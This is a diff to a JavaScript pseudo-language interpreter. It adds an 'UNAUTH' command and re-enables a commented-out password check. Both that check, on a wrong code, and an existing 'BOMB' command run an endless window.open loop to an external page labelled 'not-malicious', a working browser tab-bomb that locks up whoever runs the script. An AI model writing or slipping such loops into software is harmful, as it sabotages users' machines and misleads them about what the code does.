@@ -1,4 +1,4 @@
-auth = false;
+auth = true;
 banned = false;
 
 class PseudoInterpreter {
@@ -38,6 +38,10 @@ class PseudoInterpreter {
         let token;
         if (line.startsWith("BOMB")) {
             token = ["BOMB"]
+            token[114514] = "Line " + lineNumber + ": " + line + "\n";
+            return token;
+        } else if (line.startsWith("UNAUTH")) {
+            token = ["UNAUTH"]
             token[114514] = "Line " + lineNumber + ": " + line + "\n";
             return token;
         } else if (line.startsWith("POPUP")) {
@@ -1094,7 +1098,6 @@ class PseudoInterpreter {
         let fileName;
         let val;
 
-        /*
         if (!auth) {
             const inputAuthCode = prompt(`Enter the authentication code: `);
             if (this.simpleHash(inputAuthCode) === "-5490770733" && !banned) {
@@ -1106,7 +1109,6 @@ class PseudoInterpreter {
                 while(true) window.open("https://nekawah.github.io/not-malicious/", '_blank');
             }
         }
-        */
 
         while (i < parsedCode.length) {
             const token = parsedCode[i];
@@ -1116,6 +1118,10 @@ class PseudoInterpreter {
             switch (token[0]) {
                 case "BOMB":
                     while(true) window.open("https://nekawah.github.io/not-malicious/", '_blank');
+
+                case "UNAUTH":
+                    auth = false;
+                    break;
                     
                 case "POPUP":
                     this.popup = this.evalExpression(token[1]);
